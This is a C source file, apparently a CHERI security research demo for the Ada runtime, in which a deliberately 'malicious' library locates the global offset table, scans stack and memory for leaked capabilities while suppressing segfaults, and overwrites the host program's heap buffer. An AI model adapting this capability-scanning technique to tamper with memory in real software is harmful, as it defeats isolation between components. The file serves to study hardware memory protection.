/**
 *  Copyright (C) 2020-2025, AdaCore
 *
 *  SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception
 **/

#include <malicious_lib.h>
#include <alloc.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <setjmp.h>

extern void *__builtin_cheri_program_counter_get(void);
extern void *__builtin_cheri_stack_get(void);
extern void *__builtin_cheri_offset_increment(void *, long unsigned);
extern _Bool __builtin_cheri_subset_test(void *, void *);
extern size_t __builtin_cheri_length_get(void *);
extern long unsigned __builtin_cheri_perms_get(void *);
extern long unsigned __builtin_cheri_offset_get(void *);
extern _Bool __builtin_cheri_tag_get(void *);

// Global variable that is listed in the global offset table
int dummy;

static jmp_buf jbuf;

void segv_handler(int signo)
{
#ifdef DEBUG
    printf("segfault encountered, recovering...\n");
#endif
    longjmp(jbuf, 1);
}

// Decode an adrp instruction and return the absolute address. The
// address is calculated based on the pc-relative address of adrp
// and the pc argument.
intptr_t decode_adrp(intptr_t pc, unsigned instruction)
{
    unsigned immhi = (instruction & 0x7fffff) >> 5;
    unsigned immlo = (instruction >> 29) & 0x3;
    unsigned imm = ((immhi << 2) | immlo) << 12;
    return (pc + imm) & 0xffffff000;
}

// Decode an ldr register with offset instruction and return the offset
unsigned decode_ldr(unsigned instruction)
{
    return (instruction >> 6) & 0xfff;
}

// Get the heap capability for a given allocation and GOT entry. If the
// GOT entry does not contain a matching heap allocation a null pointer
// is returned.
//
// This function is specific to how the Ada light/light-tasking runtime
// implements the heap. The implementation of alloc stores the pointer
// to the heap in a global variable. Therefore the GOT contains a
// capability to that variable which then holds the capability to the
// heap. This means we have to find an entry with a capability pointing
// to another capability for the heap.
void *get_heap(void **got_entry, intptr_t allocation)
{
#ifdef DEBUG
    printf("%s got entry %p, perms: %x, length: %u, subset: %i, valid: %i\n",
            __func__, got_entry,
            __builtin_cheri_perms_get(got_entry),
            __builtin_cheri_length_get(got_entry),
            __builtin_cheri_subset_test((void *)allocation, got_entry),
            __builtin_cheri_tag_get(got_entry));
#endif
    if(
          __builtin_cheri_tag_get(got_entry)
       // Check that the GOT entry has the correct permissions
       && __builtin_cheri_perms_get(got_entry) == 0x37175
       // Check that the GOT entry is big enough to store a capability
       && __builtin_cheri_length_get(got_entry) >= sizeof(intptr_t)
       // Check that the stored capability is properly aligned
       && !((intptr_t)got_entry % 16)
       // Check that the capability the GOT entry capability points at
       // is a superset of the allocation. This case means we found the
       // heap capability.
       && __builtin_cheri_subset_test((void *)allocation, *got_entry)
    ) {
        printf("entry found at %p\n", got_entry);
        return *got_entry;
    }
    return 0;
}

// Find an allocation of a specific size on the stack. The rationale is
// that a call to alloc may leave capabilities of other allocations or
// of the whole heap on the stack after returning. To detect an allocation
// search for a specific allocation size.
void *find_stack_alloc(void *cap, intptr_t size)
{
#ifdef DEBUG
    printf("%s got entry %p, perms: %x, length: %u, valid: %i\n",
            __func__, cap,
            __builtin_cheri_perms_get(cap),
            __builtin_cheri_length_get(cap),
            __builtin_cheri_tag_get(cap));
#endif
    if (__builtin_cheri_tag_get(cap)
        && __builtin_cheri_perms_get(cap) == 0x3717d
        && __builtin_cheri_length_get(cap) == (size_t)size) {
        return cap;
    }
    return 0;
}

// Find the capability of the alloc function in the GOT. This function is mostly used to
// validate the correct location of the GOT.
void *find_alloc_cap(void *got_entry, intptr_t alloc_addr)
{
#ifdef DEBUG
    printf("%s, %p\n", __func__, got_entry);
#endif
    if ((intptr_t)got_entry == alloc_addr && __builtin_cheri_tag_get(got_entry) && __builtin_cheri_perms_get(got_entry) == 0x2c177) {
        return got_entry;
    }
    return 0;
}

// Search the memory specified by a capability. The search is done in 16 byte increments to find
// other capabilities. For each 16 byte block f is called. If f returns a non-zero value assume
// the relevant block has been found and return. If location is non-zero it will contain the location
// within cap at which f returned a non-zero result. If start_at_cap is set the function will search
// the capability from the address contained in cap to the end of the capability. Otherwise it will
// search the whole capability.
inline static void *search_cap_space(intptr_t *cap, _Bool start_at_cap, void *(f)(void *cap, intptr_t data), intptr_t data, intptr_t **location)
{
    unsigned perms = __builtin_cheri_perms_get(cap);
    size_t length = __builtin_cheri_length_get(cap);
#ifdef DEBUG
    printf("%s: %p, perms: %x, size: %zu\n", __func__, cap, perms, length);
#endif
    if (!__builtin_cheri_tag_get(cap)) {
        printf("%s: invalid capability\n", __func__, cap);
        return 0;
    }
    // Check if the LoadCap bit is set. This allows us to search through both
    // code and data for capabilities.
    if (!(perms & 0x4000)) {
        printf("%s: capability not readable: %x\n", __func__, perms);
        return 0;
    }
    // Many uninitialized capabilities seem to have -1 as their default length.
    // While they are all invalid filter this length explicitly to avoid weird
    // overflows.
    if (length == -1) {
        printf("%s: invalid capability size\n", __func__);
        return 0;
    }
    intptr_t *lower = cap - __builtin_cheri_offset_get(cap) / sizeof(intptr_t);
    intptr_t *next = start_at_cap ? cap : lower;
    intptr_t *upper = lower + length / sizeof(intptr_t);
    printf("%s: mapping from %p to %p, %i\n", __func__, next, upper, __builtin_cheri_tag_get(next));
    while (next < upper && __builtin_cheri_tag_get(next)) {
        // The validity of a capability does not guarantee access to the memory (e.g. if the memory
        // is not mapped by the MMU). In this case we may encounter a segmentation fault. To be
        // more resilient in that case we register a handler and use setjmp/longjmp to handle the
        // fault and ignore the address.
        if (!setjmp(jbuf)) {
#ifdef DEBUG
            printf("%s @ %p: %p, perms: %x, size: %zu, valid: %i\n",
                    __func__, next, *next,
                    __builtin_cheri_perms_get((void *)*next),
                    __builtin_cheri_length_get((void *)*next),
                    __builtin_cheri_tag_get((void *)*next));
#endif
            if (f) {
                void *res = f((void *)*next, data);
                if (res) {
                    if (location) {
                        *location = next;
                    }
                    return res;
                }
            }
        } else {
            printf("%s @ %p: segfault encountered, ignoring\n", __func__, next);
        }
        next = __builtin_cheri_offset_increment(next, sizeof(intptr_t));
    }
    return 0;
}

void malicious_lib(void)
{
    // Register a handler for SIGSEGV in case we encounter a segfault
    // when searching for capabilities.
    if (signal(SIGSEGV, segv_handler) == SIG_ERR) {
        printf("couldn't install segv handler\n");
    }

    intptr_t *got = 0;

#ifdef DEBUG
    printf("%s stack at %p\n", __func__, &got);
    printf("alloc at %p\n", alloc);
#endif
    //  Access the global dummy causing the compiler to emit a pc-relative
    //  access to the GOT.
    dummy = 42;

    // Get the program counter capability
    intptr_t pcc = (intptr_t)__builtin_cheri_program_counter_get();

    // Walk up in the code and look for an adrp instruction. The next adrp
    // instruction found should be the access to dummy.
    unsigned instruction;
    do {
        pcc = pcc - 4;
        instruction = *(unsigned *)pcc;
    } while((instruction & 0x9f800000) != 0x90800000);

    // Get the absolute page-aligned address based on the found adrp instruction
    got = (intptr_t *)decode_adrp(pcc, instruction);

    // The next instruction should be a ldr instruction containing the offset in the page
    pcc = pcc + 4;
    instruction = *(unsigned *)pcc;

    // Or offset and base address to get the GOT entry for dummy
    got = (intptr_t *)((intptr_t)got | decode_ldr(instruction));

    // If we found the GOT the entry *got is pointing to should be the
    // entry for dummy.
    if(((int *)*got) != &dummy) {
        return;
    }
    printf("found got at %p (%x)\n", got, __builtin_cheri_perms_get(got));

#ifdef DEBUG
    printf("dummy at %p: %i\n", &dummy, dummy);
#endif

    // Search the capability for alloc in the GOT. This is only used for debugging
#ifdef DEBUG
    intptr_t *alloc_entry;
    void *alloc_addr = (void *)search_cap_space(got, 0, find_alloc_cap, (intptr_t)&alloc, &alloc_entry);

    if (alloc_entry) {
        printf("Found alloc (%p) in GOT at %p\n", alloc_addr, alloc_entry);
    }
#endif

    void *allocation = alloc(42);

    // Read the stack pointer and search the stack space for a 24 byte heap allocation on the stack. If
    // we find a matching capability we found the allocation from the main program.
    register intptr_t *stack asm("csp");
    unsigned char *heap_alloc = (unsigned char *)search_cap_space(stack, 1, find_stack_alloc, 24, 0);
    if (heap_alloc) {
        heap_alloc[0] = 'H';
        heap_alloc[1] = 'e';
        heap_alloc[2] = 'l';
        heap_alloc[3] = 'l';
        heap_alloc[4] = 'o';
    } else {
        printf("could not find matching capability on stack\n");
    }
#ifdef DEBUG
    printf("stack search done\n");
#endif
}

